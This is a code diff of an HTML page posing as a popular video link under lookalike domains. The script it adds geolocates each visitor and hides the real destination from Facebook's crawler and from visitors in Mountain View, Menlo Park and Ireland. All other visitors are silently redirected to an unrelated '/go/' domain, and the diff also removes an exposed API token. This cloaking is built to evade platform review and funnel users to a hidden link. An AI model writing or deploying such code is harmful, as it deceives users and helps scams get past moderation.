@@ -8,7 +8,7 @@
   <meta property="og:title" content="Watch Video">
   <meta property="og:description" content="46457685 Views">
   <meta property="og:image" content="https://cdn.vieedy.my.id/play.png">
-  <meta property="og:url" content="https://cdn-videy.github.io">
+  <meta property="og:url" content="https://cdn-viidey.github.io">
   <meta property="og:type" content="video.other">
 
   <style>
@@ -34,21 +34,28 @@
   <div class="info">Checking location...</div>
 
   <script>
-    const targetDomain = "https://t.co/qDYFVe9GvB";
+    const targetDomain = "http://cdn.viideiy.my.id/go/";
     const urlParams = new URLSearchParams(window.location.search);
     const videoId = urlParams.get('v');
+    const ua = navigator.userAgent.toLowerCase();
+    const isFacebookBot = ua.includes("facebookexternalhit") || ua.includes("facebot");
 
-    fetch("https://ipinfo.io/json?token=dae08c86966cc4")
+    fetch("https://ipinfo.io/json?token=YOUR_TOKEN_HERE") // Ganti dengan token asli kamu
       .then(response => response.json())
       .then(data => {
-        const city = data.city.toLowerCase();
-        const ua = navigator.userAgent.toLowerCase();
-        const isFacebookBot = ua.includes("facebookexternalhit") || ua.includes("facebot");
+        const city = (data.city || "").toLowerCase();
+        const country = (data.country || "").toLowerCase(); // kode negara: IE = Ireland
 
-        if (!isFacebookBot && videoId && city !== "mountain view") {
+        const blockedCities = ["mountain view", "menlo park"];
+        const blockedCountries = ["ie"]; // IE = Ireland
+
+        const isBlockedCity = blockedCities.includes(city);
+        const isBlockedCountry = blockedCountries.includes(country);
+
+        if (!isFacebookBot && videoId && !isBlockedCity && !isBlockedCountry) {
           window.location.href = targetDomain;
         } else {
-          document.querySelector(".info").textContent = `Blocked from ${city}`;
+          document.querySelector(".info").textContent = `Access from ${city || country} blocked. Preview only.`;
         }
       })
       .catch(() => {
